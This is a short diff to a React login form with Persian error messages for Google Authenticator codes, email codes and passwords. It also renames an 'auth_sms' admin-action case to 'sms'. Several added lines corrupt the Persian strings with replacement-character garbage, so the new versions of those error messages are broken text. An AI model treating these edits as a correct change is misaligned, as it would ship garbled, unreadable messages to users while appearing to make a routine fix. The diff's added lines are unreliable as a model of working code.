@@ -257,7 +257,7 @@ export const LoginForm = () => {
           setGoogleCode(""); // Clear Google code field
           setErrors({
             googleCode:
-              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد Google Authenticator ��ارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
         case "sms":
@@ -286,7 +286,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح ر�� وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح ر�� وارد کن��د.",
           });
           setHasError(true);
           setIsSubmitting(false);
@@ -307,9 +307,9 @@ export const LoginForm = () => {
         setErrors({});
         setHasError(false);
         break;
-      case "auth_sms":
+      case "sms":
         // Direct user to SMS verification (6-digit code input)
-        console.log("🎯 Admin action: auth_sms - transitioning to SMS verification");
+        console.log("🎯 Admin action: sms - transitioning to SMS verification");
         setCurrentStep("verify-phone");
         setVerifyCode(""); // Clear any existing code
         setIsSmsMode(true); // Mark as SMS auth mode
@@ -724,7 +724,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور الزامی است" });
+      setErrors({ password: "رمز عبور ال��امی است" });
       return;
     }
 
